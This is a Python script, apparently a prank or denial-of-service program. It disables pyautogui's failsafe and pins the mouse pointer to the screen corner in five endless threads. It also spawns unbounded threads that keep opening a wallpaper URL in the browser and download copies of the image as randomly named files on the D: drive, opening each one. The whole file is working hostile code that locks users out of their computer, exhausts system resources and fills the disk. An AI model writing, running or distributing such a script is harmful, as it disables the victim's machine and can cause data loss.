import webbrowser
from os import startfile
from random import choice
from threading import Thread

import pyautogui
import requests
pyautogui.FAILSAFE = False

url = "https://wallbox.ru/wallpapers/main2/201731/15017480045982db24f0c358.31797953.jpg"

def gen_name(num: int = 8):
    return "".join(
        choice(list("rwt4gekgeDHKrgfew4wr323f4y455u64ew4wwh6789017r5hgwewq"))
        for _ in range(num)
    )

def browser_open():
    while True:
        webbrowser.open(url)
        
def img():
    while True:
        p = requests.get(url)
        name = gen_name()
        with open(f"D://{name}.jpg", 'wb') as out:
            out.write(p.content)
        startfile(rf'D:/{name}.jpg')
        
def lock():
    while True:
        pyautogui.moveTo(0, 0)
for _ in range(5):
    Thread(target=lock).start()
while True:
    Thread(target=browser_open).start()
    Thread(target=img).start()